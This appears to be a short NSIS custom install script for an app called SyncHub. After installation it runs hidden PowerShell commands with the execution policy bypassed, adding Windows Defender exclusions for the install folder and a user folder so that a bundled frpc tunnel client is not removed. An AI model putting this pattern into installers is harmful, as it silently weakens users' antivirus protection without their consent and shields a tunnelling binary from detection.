; SyncHub NSIS 自定义安装脚本
; 在安装完成后添加 Windows Defender 排除项，防止 frpc.exe 被误删

!macro customInstall
  ; 为安装目录添加 Defender 排除项
  ExecWait 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $INSTDIR"'
  ; 为用户数据目录添加排除项
  ExecWait 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $PROFILE\SyncHub"'
!macroend
